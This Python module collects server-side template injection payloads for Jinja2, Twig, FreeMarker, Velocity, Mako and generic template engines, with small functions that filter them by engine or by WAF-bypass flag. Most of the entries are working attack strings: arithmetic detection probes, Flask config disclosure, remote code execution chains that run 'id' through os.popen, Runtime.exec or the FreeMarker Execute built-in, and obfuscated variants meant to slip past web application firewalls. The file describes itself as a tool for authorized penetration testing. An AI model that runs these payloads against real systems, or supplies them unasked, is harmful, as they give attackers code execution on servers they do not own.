"""
SSTI Payloads - Engine-specific Server-Side Template Injection payloads.

Provides payloads categorized by template engine for authorized penetration
testing. Includes detection probes, exploitation payloads, and WAF bypass
variants for Jinja2, Twig, FreeMarker, Velocity, Mako, and generic engines.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional


@dataclass
class SSTIPayload:
    """A single SSTI payload."""
    payload: str
    engine: str             # jinja2, twig, freemarker, velocity, mako, generic
    description: str
    waf_bypass: bool = False
    risk_indicator: str = "ssti"


# ---------------------------------------------------------------------------
# Template engines
# ---------------------------------------------------------------------------

ALL_ENGINES = ["jinja2", "twig", "freemarker", "velocity", "mako", "generic"]


def get_all_engines() -> List[str]:
    return list(ALL_ENGINES)


# ---------------------------------------------------------------------------
# Jinja2 payloads (Python - Flask, Django-Jinja2)
# ---------------------------------------------------------------------------

_JINJA2_PAYLOADS = [
    SSTIPayload(
        "{{7*7}}",
        "jinja2",
        "Jinja2 arithmetic detection probe (expect 49)",
    ),
    SSTIPayload(
        "{{config}}",
        "jinja2",
        "Jinja2 Flask config disclosure",
    ),
    SSTIPayload(
        "{{config.items()}}",
        "jinja2",
        "Jinja2 Flask config items enumeration",
    ),
    SSTIPayload(
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "jinja2",
        "Jinja2 MRO subclass enumeration for RCE chain",
    ),
    SSTIPayload(
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "jinja2",
        "Jinja2 RCE via request.application globals",
    ),
    SSTIPayload(
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "jinja2",
        "Jinja2 RCE via cycler globals",
    ),
    # WAF bypass
    SSTIPayload(
        "{%set x=config%}{{x}}",
        "jinja2",
        "Jinja2 config via set statement bypass",
        waf_bypass=True,
    ),
    SSTIPayload(
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
        "jinja2",
        "Jinja2 attr filter hex escape bypass",
        waf_bypass=True,
    ),
]

# ---------------------------------------------------------------------------
# Twig payloads (PHP - Symfony)
# ---------------------------------------------------------------------------

_TWIG_PAYLOADS = [
    SSTIPayload(
        "{{7*7}}",
        "twig",
        "Twig arithmetic detection probe (expect 49)",
    ),
    SSTIPayload(
        "{{7*'7'}}",
        "twig",
        "Twig string multiplication probe (expect 49 in Twig, 7777777 in Jinja2)",
    ),
    SSTIPayload(
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "twig",
        "Twig RCE via registerUndefinedFilterCallback (Twig 1.x)",
    ),
    SSTIPayload(
        "{{['id']|filter('system')}}",
        "twig",
        "Twig RCE via filter function (Twig 2.x/3.x)",
    ),
    # WAF bypass
    SSTIPayload(
        "{{'id'|filter('syst'~'em')}}",
        "twig",
        "Twig RCE via string concatenation bypass",
        waf_bypass=True,
    ),
]

# ---------------------------------------------------------------------------
# FreeMarker payloads (Java - Spring, Apache)
# ---------------------------------------------------------------------------

_FREEMARKER_PAYLOADS = [
    SSTIPayload(
        "${7*7}",
        "freemarker",
        "FreeMarker arithmetic detection probe (expect 49)",
    ),
    SSTIPayload(
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "freemarker",
        "FreeMarker RCE via Execute built-in",
    ),
    SSTIPayload(
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "freemarker",
        "FreeMarker RCE via assign directive",
    ),
    SSTIPayload(
        "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}",
        "freemarker",
        "FreeMarker RCE via alternative tag syntax",
    ),
    # WAF bypass
    SSTIPayload(
        "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\")}",
        "freemarker",
        "FreeMarker RCE via ObjectConstructor bypass",
        waf_bypass=True,
    ),
]

# ---------------------------------------------------------------------------
# Velocity payloads (Java - Apache Velocity)
# ---------------------------------------------------------------------------

_VELOCITY_PAYLOADS = [
    SSTIPayload(
        "#set($x=7*7)${x}",
        "velocity",
        "Velocity arithmetic detection probe (expect 49)",
    ),
    SSTIPayload(
        "#set($rt=$class.forName('java.lang.Runtime'))#set($obj=$rt.getMethod('getRuntime').invoke($null))$obj.exec('id')",
        "velocity",
        "Velocity RCE via Runtime reflection",
    ),
    SSTIPayload(
        "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")",
        "velocity",
        "Velocity RCE via string class forName chain",
    ),
    # WAF bypass
    SSTIPayload(
        "#set($s=\"\")#set($rt=$s.class.forName(\"java.lang.Runtime\"))#set($obj=$rt.getMethod(\"exec\",$s.class).invoke($rt.getMethod(\"getRuntime\").invoke($null),\"id\"))",
        "velocity",
        "Velocity RCE via multi-set obfuscation bypass",
        waf_bypass=True,
    ),
]

# ---------------------------------------------------------------------------
# Mako payloads (Python - Mako templates)
# ---------------------------------------------------------------------------

_MAKO_PAYLOADS = [
    SSTIPayload(
        "${7*7}",
        "mako",
        "Mako arithmetic detection probe (expect 49)",
    ),
    SSTIPayload(
        "<%import os%>${os.popen('id').read()}",
        "mako",
        "Mako RCE via import and popen",
    ),
    SSTIPayload(
        "${self.module.cache.util.os.popen('id').read()}",
        "mako",
        "Mako RCE via module cache traversal",
    ),
    # WAF bypass
    SSTIPayload(
        "<%import importlib%>${importlib.import_module('o'+'s').popen('id').read()}",
        "mako",
        "Mako RCE via importlib string concat bypass",
        waf_bypass=True,
    ),
]

# ---------------------------------------------------------------------------
# Generic payloads (engine-agnostic detection & polyglot)
# ---------------------------------------------------------------------------

_GENERIC_PAYLOADS = [
    # Arithmetic probes across syntaxes
    SSTIPayload(
        "{{7*7}}",
        "generic",
        "Double-curly arithmetic probe (Jinja2/Twig/Handlebars)",
    ),
    SSTIPayload(
        "${7*7}",
        "generic",
        "Dollar-curly arithmetic probe (FreeMarker/Mako/EL)",
    ),
    SSTIPayload(
        "#{7*7}",
        "generic",
        "Hash-curly arithmetic probe (Ruby ERB/Pebble/EL)",
    ),
    SSTIPayload(
        "{{7*'7'}}",
        "generic",
        "String multiplication fingerprint (49=Twig, 7777777=Jinja2)",
    ),
    SSTIPayload(
        "<%= 7*7 %>",
        "generic",
        "ERB/JSP expression probe (expect 49)",
    ),
    # Polyglot probes
    SSTIPayload(
        "${{7*7}}",
        "generic",
        "Polyglot dollar-double-curly (catches FreeMarker+Jinja2/Twig)",
    ),
    SSTIPayload(
        "{{<%[%'\"}}%\\",
        "generic",
        "Polyglot error probe - triggers errors across multiple engines",
    ),
    # WAF bypass
    SSTIPayload(
        "{%25+set+x%3d7*7+%25}{{x}}",
        "generic",
        "URL-encoded Jinja2/Twig set bypass",
        waf_bypass=True,
    ),
    SSTIPayload(
        "{{().__class__.__bases__[0].__subclasses__()}}",
        "generic",
        "Python sandbox escape via tuple MRO (Jinja2/Mako)",
        waf_bypass=True,
    ),
]


# ---------------------------------------------------------------------------
# All payloads combined
# ---------------------------------------------------------------------------

_ALL_PAYLOADS = {
    "jinja2": _JINJA2_PAYLOADS,
    "twig": _TWIG_PAYLOADS,
    "freemarker": _FREEMARKER_PAYLOADS,
    "velocity": _VELOCITY_PAYLOADS,
    "mako": _MAKO_PAYLOADS,
    "generic": _GENERIC_PAYLOADS,
}


def get_ssti_payloads(
    engine: Optional[str] = None,
) -> List[SSTIPayload]:
    """Get SSTI payloads filtered by template engine.

    Parameters
    ----------
    engine : str, optional
        Template engine: jinja2, twig, freemarker, velocity, mako, generic.
        If None, returns all payloads across all engines.

    Returns
    -------
    list of SSTIPayload
    """
    if engine is None:
        return get_all_payloads_flat()
    return list(_ALL_PAYLOADS.get(engine, _ALL_PAYLOADS["generic"]))


def get_waf_bypass_payloads(engine: Optional[str] = None) -> List[SSTIPayload]:
    """Get only WAF bypass SSTI payloads, optionally filtered by engine."""
    if engine is None:
        return [p for p in get_all_payloads_flat() if p.waf_bypass]
    payloads = _ALL_PAYLOADS.get(engine, _ALL_PAYLOADS["generic"])
    return [p for p in payloads if p.waf_bypass]


def get_all_payloads_flat() -> List[SSTIPayload]:
    """Return all payloads across all template engines."""
    result: List[SSTIPayload] = []
    for payloads in _ALL_PAYLOADS.values():
        result.extend(payloads)
    return result
